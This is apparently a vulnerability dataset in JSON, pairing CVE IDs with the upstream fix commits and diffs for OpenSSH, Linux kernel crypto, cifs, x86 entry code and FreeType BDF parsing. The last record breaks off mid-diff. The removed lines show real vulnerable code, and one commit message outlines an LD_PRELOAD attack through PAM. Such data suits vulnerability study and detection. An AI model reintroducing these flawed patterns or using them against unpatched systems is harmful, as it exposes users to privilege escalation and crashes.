[{"CVE_ID":"CVE-2015-8325","CWE_ID":"264","category":"security","commit_id":"85bdcd7c92fe7ff133bbc4e10a65c91810f88755","commit_message":"From 85bdcd7c92fe7ff133bbc4e10a65c91810f88755 Mon Sep 17 00:00:00 2001\nFrom: Damien Miller <djm@mindrot.org>\nDate: Wed, 13 Apr 2016 10:39:57 +1000\nSubject: ignore PAM environment vars when UseLogin=yes\n\nIf PAM is configured to read user-specified environment variables\nand UseLogin=yes in sshd_config, then a hostile local user may\nattack \/bin\/login via LD_PRELOAD or similar environment variables\nset via PAM.\n\nCVE-2015-8325, found by Shayan Sadigh, via Colin Watson\n---\n session.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/session.c b\/session.c\nindex 48592457..4653b09f 100644\n--- a\/session.c\n+++ b\/session.c\n@@ -1322,7 +1322,7 @@ do_setup_env(Session *s, const char *shell)\n \t * Pull in any environment variables that may have\n \t * been set by PAM.\n \t *\/\n-\tif (options.use_pam) {\n+\tif (options.use_pam && !options.use_login) {\n \t\tchar **p;\n \n \t\tp = fetch_pam_child_environment();\n-- \ncgit v1.2.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-9644","CWE_ID":"264","category":"security","commit_id":"4943ba16bbc2db05115707b3ff7b4874e9e3c560","commit_message":"From 4943ba16bbc2db05115707b3ff7b4874e9e3c560 Mon Sep 17 00:00:00 2001\nFrom: Kees Cook <keescook@chromium.org>\nDate: Mon, 24 Nov 2014 16:32:38 -0800\nSubject: [PATCH] crypto: include crypto- module prefix in template\n\nThis adds the module loading prefix \"crypto-\" to the template lookup\nas well.\n\nFor example, attempting to load 'vfat(blowfish)' via AF_ALG now correctly\nincludes the \"crypto-\" prefix at every level, correctly rejecting \"vfat\":\n\n\tnet-pf-38\n\talgif-hash\n\tcrypto-vfat(blowfish)\n\tcrypto-vfat(blowfish)-all\n\tcrypto-vfat\n\nReported-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nAcked-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\n---\n arch\/x86\/crypto\/fpu.c | 3 +++\n crypto\/algapi.c       | 4 ++--\n crypto\/authenc.c      | 1 +\n crypto\/authencesn.c   | 1 +\n crypto\/cbc.c          | 1 +\n crypto\/ccm.c          | 1 +\n crypto\/chainiv.c      | 1 +\n crypto\/cmac.c         | 1 +\n crypto\/cryptd.c       | 1 +\n crypto\/ctr.c          | 1 +\n crypto\/cts.c          | 1 +\n crypto\/ecb.c          | 1 +\n crypto\/eseqiv.c       | 1 +\n crypto\/gcm.c          | 1 +\n crypto\/hmac.c         | 1 +\n crypto\/lrw.c          | 1 +\n crypto\/mcryptd.c      | 1 +\n crypto\/pcbc.c         | 1 +\n crypto\/pcrypt.c       | 1 +\n crypto\/seqiv.c        | 1 +\n crypto\/vmac.c         | 1 +\n crypto\/xcbc.c         | 1 +\n crypto\/xts.c          | 1 +\n 23 files changed, 26 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/crypto\/fpu.c b\/arch\/x86\/crypto\/fpu.c\nindex 98d7a188f46b0..f368ba261739f 100644\n--- a\/arch\/x86\/crypto\/fpu.c\n+++ b\/arch\/x86\/crypto\/fpu.c\n@@ -17,6 +17,7 @@\n #include <linux\/kernel.h>\n #include <linux\/module.h>\n #include <linux\/slab.h>\n+#include <linux\/crypto.h>\n #include <asm\/i387.h>\n \n struct crypto_fpu_ctx {\n@@ -159,3 +160,5 @@ void __exit crypto_fpu_exit(void)\n {\n \tcrypto_unregister_template(&crypto_fpu_tmpl);\n }\n+\n+MODULE_ALIAS_CRYPTO(\"fpu\");\ndiff --git a\/crypto\/algapi.c b\/crypto\/algapi.c\nindex e8d3a7dca8c48..71a8143e23b13 100644\n--- a\/crypto\/algapi.c\n+++ b\/crypto\/algapi.c\n@@ -509,8 +509,8 @@ static struct crypto_template *__crypto_lookup_template(const char *name)\n \n struct crypto_template *crypto_lookup_template(const char *name)\n {\n-\treturn try_then_request_module(__crypto_lookup_template(name), \"%s\",\n-\t\t\t\t       name);\n+\treturn try_then_request_module(__crypto_lookup_template(name),\n+\t\t\t\t       \"crypto-%s\", name);\n }\n EXPORT_SYMBOL_GPL(crypto_lookup_template);\n \ndiff --git a\/crypto\/authenc.c b\/crypto\/authenc.c\nindex e1223559d5dfd..78fb16cab13f9 100644\n--- a\/crypto\/authenc.c\n+++ b\/crypto\/authenc.c\n@@ -721,3 +721,4 @@ module_exit(crypto_authenc_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Simple AEAD wrapper for IPsec\");\n+MODULE_ALIAS_CRYPTO(\"authenc\");\ndiff --git a\/crypto\/authencesn.c b\/crypto\/authencesn.c\nindex 4be0dd4373a9a..024bff2344fcf 100644\n--- a\/crypto\/authencesn.c\n+++ b\/crypto\/authencesn.c\n@@ -814,3 +814,4 @@ module_exit(crypto_authenc_esn_module_exit);\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Steffen Klassert <steffen.klassert@secunet.com>\");\n MODULE_DESCRIPTION(\"AEAD wrapper for IPsec with extended sequence numbers\");\n+MODULE_ALIAS_CRYPTO(\"authencesn\");\ndiff --git a\/crypto\/cbc.c b\/crypto\/cbc.c\nindex 61ac42e1e32bb..780ee27b2d43d 100644\n--- a\/crypto\/cbc.c\n+++ b\/crypto\/cbc.c\n@@ -289,3 +289,4 @@ module_exit(crypto_cbc_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"CBC block cipher algorithm\");\n+MODULE_ALIAS_CRYPTO(\"cbc\");\ndiff --git a\/crypto\/ccm.c b\/crypto\/ccm.c\nindex 647575b412815..003bbbd21a2ba 100644\n--- a\/crypto\/ccm.c\n+++ b\/crypto\/ccm.c\n@@ -881,3 +881,4 @@ MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Counter with CBC MAC\");\n MODULE_ALIAS_CRYPTO(\"ccm_base\");\n MODULE_ALIAS_CRYPTO(\"rfc4309\");\n+MODULE_ALIAS_CRYPTO(\"ccm\");\ndiff --git a\/crypto\/chainiv.c b\/crypto\/chainiv.c\nindex 9c294c8f9a078..63c17d5992f79 100644\n--- a\/crypto\/chainiv.c\n+++ b\/crypto\/chainiv.c\n@@ -359,3 +359,4 @@ module_exit(chainiv_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Chain IV Generator\");\n+MODULE_ALIAS_CRYPTO(\"chainiv\");\ndiff --git a\/crypto\/cmac.c b\/crypto\/cmac.c\nindex 50880cf17fad7..7a8bfbd548f60 100644\n--- a\/crypto\/cmac.c\n+++ b\/crypto\/cmac.c\n@@ -313,3 +313,4 @@ module_exit(crypto_cmac_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"CMAC keyed hash algorithm\");\n+MODULE_ALIAS_CRYPTO(\"cmac\");\ndiff --git a\/crypto\/cryptd.c b\/crypto\/cryptd.c\nindex e592c90abebb7..650afac10fd78 100644\n--- a\/crypto\/cryptd.c\n+++ b\/crypto\/cryptd.c\n@@ -955,3 +955,4 @@ module_exit(cryptd_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Software async crypto daemon\");\n+MODULE_ALIAS_CRYPTO(\"cryptd\");\ndiff --git a\/crypto\/ctr.c b\/crypto\/ctr.c\nindex 3d81ff7e6b489..2386f73139520 100644\n--- a\/crypto\/ctr.c\n+++ b\/crypto\/ctr.c\n@@ -467,3 +467,4 @@ module_exit(crypto_ctr_module_exit);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"CTR Counter block mode\");\n MODULE_ALIAS_CRYPTO(\"rfc3686\");\n+MODULE_ALIAS_CRYPTO(\"ctr\");\ndiff --git a\/crypto\/cts.c b\/crypto\/cts.c\nindex 133f0874c95ec..bd9405820e8ac 100644\n--- a\/crypto\/cts.c\n+++ b\/crypto\/cts.c\n@@ -351,3 +351,4 @@ module_exit(crypto_cts_module_exit);\n \n MODULE_LICENSE(\"Dual BSD\/GPL\");\n MODULE_DESCRIPTION(\"CTS-CBC CipherText Stealing for CBC\");\n+MODULE_ALIAS_CRYPTO(\"cts\");\ndiff --git a\/crypto\/ecb.c b\/crypto\/ecb.c\nindex 935cfef4aa847..12011aff09713 100644\n--- a\/crypto\/ecb.c\n+++ b\/crypto\/ecb.c\n@@ -185,3 +185,4 @@ module_exit(crypto_ecb_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"ECB block cipher algorithm\");\n+MODULE_ALIAS_CRYPTO(\"ecb\");\ndiff --git a\/crypto\/eseqiv.c b\/crypto\/eseqiv.c\nindex bf7ab4a89493c..f116fae766f81 100644\n--- a\/crypto\/eseqiv.c\n+++ b\/crypto\/eseqiv.c\n@@ -267,3 +267,4 @@ module_exit(eseqiv_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Encrypted Sequence Number IV Generator\");\n+MODULE_ALIAS_CRYPTO(\"eseqiv\");\ndiff --git a\/crypto\/gcm.c b\/crypto\/gcm.c\nindex aefb74a3f522b..2e403f6138c14 100644\n--- a\/crypto\/gcm.c\n+++ b\/crypto\/gcm.c\n@@ -1444,3 +1444,4 @@ MODULE_AUTHOR(\"Mikko Herranen <mh1@iki.fi>\");\n MODULE_ALIAS_CRYPTO(\"gcm_base\");\n MODULE_ALIAS_CRYPTO(\"rfc4106\");\n MODULE_ALIAS_CRYPTO(\"rfc4543\");\n+MODULE_ALIAS_CRYPTO(\"gcm\");\ndiff --git a\/crypto\/hmac.c b\/crypto\/hmac.c\nindex e392219ddc619..72e38c098bb31 100644\n--- a\/crypto\/hmac.c\n+++ b\/crypto\/hmac.c\n@@ -268,3 +268,4 @@ module_exit(hmac_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"HMAC hash algorithm\");\n+MODULE_ALIAS_CRYPTO(\"hmac\");\ndiff --git a\/crypto\/lrw.c b\/crypto\/lrw.c\nindex ba42acc4deba8..6f9908a7ebcbe 100644\n--- a\/crypto\/lrw.c\n+++ b\/crypto\/lrw.c\n@@ -400,3 +400,4 @@ module_exit(crypto_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"LRW block cipher mode\");\n+MODULE_ALIAS_CRYPTO(\"lrw\");\ndiff --git a\/crypto\/mcryptd.c b\/crypto\/mcryptd.c\nindex b39fbd5301020..a8e870444ea9c 100644\n--- a\/crypto\/mcryptd.c\n+++ b\/crypto\/mcryptd.c\n@@ -703,3 +703,4 @@ module_exit(mcryptd_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Software async multibuffer crypto daemon\");\n+MODULE_ALIAS_CRYPTO(\"mcryptd\");\ndiff --git a\/crypto\/pcbc.c b\/crypto\/pcbc.c\nindex d1b8bdfb58551..f654965f09338 100644\n--- a\/crypto\/pcbc.c\n+++ b\/crypto\/pcbc.c\n@@ -295,3 +295,4 @@ module_exit(crypto_pcbc_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"PCBC block cipher algorithm\");\n+MODULE_ALIAS_CRYPTO(\"pcbc\");\ndiff --git a\/crypto\/pcrypt.c b\/crypto\/pcrypt.c\nindex 309d345ead958..c305d4112735c 100644\n--- a\/crypto\/pcrypt.c\n+++ b\/crypto\/pcrypt.c\n@@ -565,3 +565,4 @@ module_exit(pcrypt_exit);\n MODULE_LICENSE(\"GPL\");\n MODULE_AUTHOR(\"Steffen Klassert <steffen.klassert@secunet.com>\");\n MODULE_DESCRIPTION(\"Parallel crypto wrapper\");\n+MODULE_ALIAS_CRYPTO(\"pcrypt\");\ndiff --git a\/crypto\/seqiv.c b\/crypto\/seqiv.c\nindex ee190fcedcd2e..9daa854cc485b 100644\n--- a\/crypto\/seqiv.c\n+++ b\/crypto\/seqiv.c\n@@ -362,3 +362,4 @@ module_exit(seqiv_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Sequence Number IV Generator\");\n+MODULE_ALIAS_CRYPTO(\"seqiv\");\ndiff --git a\/crypto\/vmac.c b\/crypto\/vmac.c\nindex d84c24bd7ff7b..df76a816cfb22 100644\n--- a\/crypto\/vmac.c\n+++ b\/crypto\/vmac.c\n@@ -713,3 +713,4 @@ module_exit(vmac_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"VMAC hash algorithm\");\n+MODULE_ALIAS_CRYPTO(\"vmac\");\ndiff --git a\/crypto\/xcbc.c b\/crypto\/xcbc.c\nindex a5fbdf3738cfd..df90b332554cf 100644\n--- a\/crypto\/xcbc.c\n+++ b\/crypto\/xcbc.c\n@@ -286,3 +286,4 @@ module_exit(crypto_xcbc_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"XCBC keyed hash algorithm\");\n+MODULE_ALIAS_CRYPTO(\"xcbc\");\ndiff --git a\/crypto\/xts.c b\/crypto\/xts.c\nindex ca1608f44cb56..f6fd43f100c8c 100644\n--- a\/crypto\/xts.c\n+++ b\/crypto\/xts.c\n@@ -362,3 +362,4 @@ module_exit(crypto_module_exit);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"XTS block cipher mode\");\n+MODULE_ALIAS_CRYPTO(\"xts\");\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-1090","CWE_ID":"264","category":"security","commit_id":"88d7d4e4a439f32acc56a6d860e415ee71d3df08","commit_message":"From 88d7d4e4a439f32acc56a6d860e415ee71d3df08 Mon Sep 17 00:00:00 2001\nFrom: Jeff Layton <jlayton@redhat.com>\nDate: Thu, 23 Feb 2012 09:37:45 -0500\nSubject: [PATCH] cifs: fix dentry refcount leak when opening a FIFO on lookup\n\ncommit 5bccda0ebc7c0331b81ac47d39e4b920b198b2cd upstream.\n\nThe cifs code will attempt to open files on lookup under certain\ncircumstances. What happens though if we find that the file we opened\nwas actually a FIFO or other special file?\n\nCurrently, the open filehandle just ends up being leaked leading to\na dentry refcount mismatch and oops on umount. Fix this by having the\ncode close the filehandle on the server if it turns out not to be a\nregular file. While we're at it, change this spaghetti if statement\ninto a switch too.\n\nReported-by: CAI Qian <caiqian@redhat.com>\nTested-by: CAI Qian <caiqian@redhat.com>\nReviewed-by: Shirish Pargaonkar <shirishpargaonkar@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <smfrench@gmail.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n fs\/cifs\/dir.c | 20 ++++++++++++++++++--\n 1 file changed, 18 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/cifs\/dir.c b\/fs\/cifs\/dir.c\nindex e4c3334511377..bf68b4fc9512f 100644\n--- a\/fs\/cifs\/dir.c\n+++ b\/fs\/cifs\/dir.c\n@@ -584,10 +584,26 @@ cifs_lookup(struct inode *parent_dir_inode, struct dentry *direntry,\n \t\t\t * If either that or op not supported returned, follow\n \t\t\t * the normal lookup.\n \t\t\t *\/\n-\t\t\tif ((rc == 0) || (rc == -ENOENT))\n+\t\t\tswitch (rc) {\n+\t\t\tcase 0:\n+\t\t\t\t\/*\n+\t\t\t\t * The server may allow us to open things like\n+\t\t\t\t * FIFOs, but the client isn't set up to deal\n+\t\t\t\t * with that. If it's not a regular file, just\n+\t\t\t\t * close it and proceed as if it were a normal\n+\t\t\t\t * lookup.\n+\t\t\t\t *\/\n+\t\t\t\tif (newInode && !S_ISREG(newInode->i_mode)) {\n+\t\t\t\t\tCIFSSMBClose(xid, pTcon, fileHandle);\n+\t\t\t\t\tbreak;\n+\t\t\t\t}\n+\t\t\tcase -ENOENT:\n \t\t\t\tposix_open = true;\n-\t\t\telse if ((rc == -EINVAL) || (rc != -EOPNOTSUPP))\n+\t\t\tcase -EOPNOTSUPP:\n+\t\t\t\tbreak;\n+\t\t\tdefault:\n \t\t\t\tpTcon->broken_posix_open = true;\n+\t\t\t}\n \t\t}\n \t\tif (!posix_open)\n \t\t\trc = cifs_get_inode_info_unix(&newInode, full_path,\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9675","CWE_ID":"264","category":"security","commit_id":"2c4832d30939b45c05757f0a05128ce64c4cacc7","commit_message":"From 2c4832d30939b45c05757f0a05128ce64c4cacc7 Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Fri, 7 Nov 2014 07:42:33 +0100\nSubject: Fix Savannah bug #43535.\n\n* src\/bdf\/bdflib.c (_bdf_strncmp): New macro that checks one\ncharacter more than `strncmp'.\ns\/ft_strncmp\/_bdf_strncmp\/ everywhere.\n---\n ChangeLog        | 12 +++++++++--\n src\/bdf\/bdflib.c | 62 +++++++++++++++++++++++++++++++++-----------------------\n 2 files changed, 47 insertions(+), 27 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex d709e41..22060e7 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,9 +1,17 @@\n+2014-11-07  Werner Lemberg  <wl@gnu.org>\n+\n+\tFix Savannah bug #43535.\n+\n+\t* src\/bdf\/bdflib.c (_bdf_strncmp): New macro that checks one\n+\tcharacter more than `strncmp'.\n+\ts\/ft_strncmp\/_bdf_strncmp\/ everywhere.\n+\n 2014-11-06  Werner Lemberg  <wl@gnu.org>\n \n \tFix Savannah bug #43548.\n \n-\t* src\/pcf\/pcfread (pcf_get_encodings): Add sanity checks for row and\n-\tcolumn values.\n+\t* src\/pcf\/pcfread.c (pcf_get_encodings): Add sanity checks for row\n+\tand column values.\n \n 2014-11-06  Werner Lemberg  <wl@gnu.org>\n \ndiff --git a\/src\/bdf\/bdflib.c b\/src\/bdf\/bdflib.c\nindex 2eda11c..c128526 100644\n--- a\/src\/bdf\/bdflib.c\n+++ b\/src\/bdf\/bdflib.c\n@@ -169,6 +169,18 @@\n                         sizeof ( _bdf_properties[0] );\n \n \n+  \/* An auxiliary macro to parse properties, to be used in conditionals. *\/\n+  \/* It behaves like `strncmp' but also tests the following character    *\/\n+  \/* whether it is a whitespace or NULL.                                 *\/\n+  \/* `property' is a constant string of length `n' to compare with.      *\/\n+#define _bdf_strncmp( name, property, n )      \\\n+          ( ft_strncmp( name, property, n ) || \\\n+            !( name[n] == ' '  ||              \\\n+               name[n] == '\\0' ||              \\\n+               name[n] == '\\n' ||              \\\n+               name[n] == '\\r' ||              \\\n+               name[n] == '\\t' )            )\n+\n   \/* Auto correction messages. *\/\n #define ACMSG1   \"FONT_ASCENT property missing.  \" \\\n                  \"Added `FONT_ASCENT %hd'.\\n\"\n@@ -1408,7 +1420,7 @@\n \n     \/* If the property happens to be a comment, then it doesn't need *\/\n     \/* to be added to the internal hash table.                       *\/\n-    if ( ft_strncmp( name, \"COMMENT\", 7 ) != 0 )\n+    if ( _bdf_strncmp( name, \"COMMENT\", 7 ) != 0 )\n     {\n       \/* Add the property to the font property table. *\/\n       error = hash_insert( fp->name,\n@@ -1426,13 +1438,13 @@\n     \/* FONT_ASCENT and FONT_DESCENT need to be assigned if they are        *\/\n     \/* present, and the SPACING property should override the default       *\/\n     \/* spacing.                                                            *\/\n-    if ( ft_strncmp( name, \"DEFAULT_CHAR\", 12 ) == 0 )\n+    if ( _bdf_strncmp( name, \"DEFAULT_CHAR\", 12 ) == 0 )\n       font->default_char = fp->value.l;\n-    else if ( ft_strncmp( name, \"FONT_ASCENT\", 11 ) == 0 )\n+    else if ( _bdf_strncmp( name, \"FONT_ASCENT\", 11 ) == 0 )\n       font->font_ascent = fp->value.l;\n-    else if ( ft_strncmp( name, \"FONT_DESCENT\", 12 ) == 0 )\n+    else if ( _bdf_strncmp( name, \"FONT_DESCENT\", 12 ) == 0 )\n       font->font_descent = fp->value.l;\n-    else if ( ft_strncmp( name, \"SPACING\", 7 ) == 0 )\n+    else if ( _bdf_strncmp( name, \"SPACING\", 7 ) == 0 )\n     {\n       if ( !fp->value.atom )\n       {\n@@ -1490,7 +1502,7 @@\n     memory = font->memory;\n \n     \/* Check for a comment. *\/\n-    if ( ft_strncmp( line, \"COMMENT\", 7 ) == 0 )\n+    if ( _bdf_strncmp( line, \"COMMENT\", 7 ) == 0 )\n     {\n       linelen -= 7;\n \n@@ -1507,7 +1519,7 @@\n     \/* The very first thing expected is the number of glyphs. *\/\n     if ( !( p->flags & _BDF_GLYPHS ) )\n     {\n-      if ( ft_strncmp( line, \"CHARS\", 5 ) != 0 )\n+      if ( _bdf_strncmp( line, \"CHARS\", 5 ) != 0 )\n       {\n         FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"CHARS\" ));\n         error = FT_THROW( Missing_Chars_Field );\n@@ -1541,7 +1553,7 @@\n     }\n \n     \/* Check for the ENDFONT field. *\/\n-    if ( ft_strncmp( line, \"ENDFONT\", 7 ) == 0 )\n+    if ( _bdf_strncmp( line, \"ENDFONT\", 7 ) == 0 )\n     {\n       \/* Sort the glyphs by encoding. *\/\n       ft_qsort( (char *)font->glyphs,\n@@ -1555,7 +1567,7 @@\n     }\n \n     \/* Check for the ENDCHAR field. *\/\n-    if ( ft_strncmp( line, \"ENDCHAR\", 7 ) == 0 )\n+    if ( _bdf_strncmp( line, \"ENDCHAR\", 7 ) == 0 )\n     {\n       p->glyph_enc = 0;\n       p->flags    &= ~_BDF_GLYPH_BITS;\n@@ -1571,7 +1583,7 @@\n       goto Exit;\n \n     \/* Check for the STARTCHAR field. *\/\n-    if ( ft_strncmp( line, \"STARTCHAR\", 9 ) == 0 )\n+    if ( _bdf_strncmp( line, \"STARTCHAR\", 9 ) == 0 )\n     {\n       \/* Set the character name in the parse info first until the *\/\n       \/* encoding can be checked for an unencoded character.      *\/\n@@ -1605,7 +1617,7 @@\n     }\n \n     \/* Check for the ENCODING field. *\/\n-    if ( ft_strncmp( line, \"ENCODING\", 8 ) == 0 )\n+    if ( _bdf_strncmp( line, \"ENCODING\", 8 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_GLYPH ) )\n       {\n@@ -1791,7 +1803,7 @@\n     }\n \n     \/* Expect the SWIDTH (scalable width) field next. *\/\n-    if ( ft_strncmp( line, \"SWIDTH\", 6 ) == 0 )\n+    if ( _bdf_strncmp( line, \"SWIDTH\", 6 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_ENCODING ) )\n         goto Missing_Encoding;\n@@ -1807,7 +1819,7 @@\n     }\n \n     \/* Expect the DWIDTH (scalable width) field next. *\/\n-    if ( ft_strncmp( line, \"DWIDTH\", 6 ) == 0 )\n+    if ( _bdf_strncmp( line, \"DWIDTH\", 6 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_ENCODING ) )\n         goto Missing_Encoding;\n@@ -1835,7 +1847,7 @@\n     }\n \n     \/* Expect the BBX field next. *\/\n-    if ( ft_strncmp( line, \"BBX\", 3 ) == 0 )\n+    if ( _bdf_strncmp( line, \"BBX\", 3 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_ENCODING ) )\n         goto Missing_Encoding;\n@@ -1903,7 +1915,7 @@\n     }\n \n     \/* And finally, gather up the bitmap. *\/\n-    if ( ft_strncmp( line, \"BITMAP\", 6 ) == 0 )\n+    if ( _bdf_strncmp( line, \"BITMAP\", 6 ) == 0 )\n     {\n       unsigned long  bitmap_size;\n \n@@ -1978,7 +1990,7 @@\n     p    = (_bdf_parse_t *)    client_data;\n \n     \/* Check for the end of the properties. *\/\n-    if ( ft_strncmp( line, \"ENDPROPERTIES\", 13 ) == 0 )\n+    if ( _bdf_strncmp( line, \"ENDPROPERTIES\", 13 ) == 0 )\n     {\n       \/* If the FONT_ASCENT or FONT_DESCENT properties have not been      *\/\n       \/* encountered yet, then make sure they are added as properties and *\/\n@@ -2019,12 +2031,12 @@\n     }\n \n     \/* Ignore the _XFREE86_GLYPH_RANGES properties. *\/\n-    if ( ft_strncmp( line, \"_XFREE86_GLYPH_RANGES\", 21 ) == 0 )\n+    if ( _bdf_strncmp( line, \"_XFREE86_GLYPH_RANGES\", 21 ) == 0 )\n       goto Exit;\n \n     \/* Handle COMMENT fields and properties in a special way to preserve *\/\n     \/* the spacing.                                                      *\/\n-    if ( ft_strncmp( line, \"COMMENT\", 7 ) == 0 )\n+    if ( _bdf_strncmp( line, \"COMMENT\", 7 ) == 0 )\n     {\n       name = value = line;\n       value += 7;\n@@ -2088,7 +2100,7 @@\n \n     \/* Check for a comment.  This is done to handle those fonts that have *\/\n     \/* comments before the STARTFONT line for some reason.                *\/\n-    if ( ft_strncmp( line, \"COMMENT\", 7 ) == 0 )\n+    if ( _bdf_strncmp( line, \"COMMENT\", 7 ) == 0 )\n     {\n       if ( p->opts->keep_comments != 0 && p->font != 0 )\n       {\n@@ -2114,7 +2126,7 @@\n     {\n       memory = p->memory;\n \n-      if ( ft_strncmp( line, \"STARTFONT\", 9 ) != 0 )\n+      if ( _bdf_strncmp( line, \"STARTFONT\", 9 ) != 0 )\n       {\n         \/* we don't emit an error message since this code gets *\/\n         \/* explicitly caught one level higher                  *\/\n@@ -2162,7 +2174,7 @@\n     }\n \n     \/* Check for the start of the properties. *\/\n-    if ( ft_strncmp( line, \"STARTPROPERTIES\", 15 ) == 0 )\n+    if ( _bdf_strncmp( line, \"STARTPROPERTIES\", 15 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_FONT_BBX ) )\n       {\n@@ -2191,7 +2203,7 @@\n     }\n \n     \/* Check for the FONTBOUNDINGBOX field. *\/\n-    if ( ft_strncmp( line, \"FONTBOUNDINGBOX\", 15 ) == 0 )\n+    if ( _bdf_strncmp( line, \"FONTBOUNDINGBOX\", 15 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_SIZE ) )\n       {\n@@ -2222,7 +2234,7 @@\n     }\n \n     \/* The next thing to check for is the FONT field. *\/\n-    if ( ft_strncmp( line, \"FONT\", 4 ) == 0 )\n+    if ( _bdf_strncmp( line, \"FONT\", 4 ) == 0 )\n     {\n       error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n       if ( error )\n@@ -2257,7 +2269,7 @@\n     }\n \n     \/* Check for the SIZE field. *\/\n-    if ( ft_strncmp( line, \"SIZE\", 4 ) == 0 )\n+    if ( _bdf_strncmp( line, \"SIZE\", 4 ) == 0 )\n     {\n       if ( !( p->flags & _BDF_FONT_NAME ) )\n       {\n@@ -2311,7 +2323,7 @@\n     }\n \n     \/* Check for the CHARS field -- font properties are optional *\/\n-    if ( ft_strncmp( line, \"CHARS\", 5 ) == 0 )\n+    if ( _bdf_strncmp( line, \"CHARS\", 5 ) == 0 )\n     {\n       char  nbuf[128];\n \n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-8897","CWE_ID":"264","category":"security","commit_id":"d8ba61ba58c88d5207c1ba2f7d9a2280e7d03be9","commit_message":"From d8ba61ba58c88d5207c1ba2f7d9a2280e7d03be9 Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@kernel.org>\nDate: Thu, 23 Jul 2015 15:37:48 -0700\nSubject: [PATCH] x86\/entry\/64: Don't use IST entry for #BP stack\n\nThere's nothing IST-worthy about #BP\/int3.  We don't allow kprobes\nin the small handful of places in the kernel that run at CPL0 with\nan invalid stack, and 32-bit kernels have used normal interrupt\ngates for #BP forever.\n\nFurthermore, we don't allow kprobes in places that have usergs while\nin kernel mode, so \"paranoid\" is also unnecessary.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: stable@vger.kernel.org\n---\n arch\/x86\/entry\/entry_64.S |  2 +-\n arch\/x86\/kernel\/idt.c     |  2 --\n arch\/x86\/kernel\/traps.c   | 15 ++++++++-------\n 3 files changed, 9 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/arch\/x86\/entry\/entry_64.S b\/arch\/x86\/entry\/entry_64.S\nindex d5c7f18f79ace..9b114675fbc05 100644\n--- a\/arch\/x86\/entry\/entry_64.S\n+++ b\/arch\/x86\/entry\/entry_64.S\n@@ -1138,7 +1138,7 @@ apicinterrupt3 HYPERV_REENLIGHTENMENT_VECTOR \\\n #endif \/* CONFIG_HYPERV *\/\n \n idtentry debug\t\t\tdo_debug\t\thas_error_code=0\tparanoid=1 shift_ist=DEBUG_STACK\n-idtentry int3\t\t\tdo_int3\t\t\thas_error_code=0\tparanoid=1 shift_ist=DEBUG_STACK\n+idtentry int3\t\t\tdo_int3\t\t\thas_error_code=0\n idtentry stack_segment\t\tdo_stack_segment\thas_error_code=1\n \n #ifdef CONFIG_XEN\ndiff --git a\/arch\/x86\/kernel\/idt.c b\/arch\/x86\/kernel\/idt.c\nindex 56d99be3706a2..50bee5fe11401 100644\n--- a\/arch\/x86\/kernel\/idt.c\n+++ b\/arch\/x86\/kernel\/idt.c\n@@ -160,7 +160,6 @@ static const __initconst struct idt_data early_pf_idts[] = {\n  *\/\n static const __initconst struct idt_data dbg_idts[] = {\n \tINTG(X86_TRAP_DB,\tdebug),\n-\tINTG(X86_TRAP_BP,\tint3),\n };\n #endif\n \n@@ -183,7 +182,6 @@ gate_desc debug_idt_table[IDT_ENTRIES] __page_aligned_bss;\n static const __initconst struct idt_data ist_idts[] = {\n 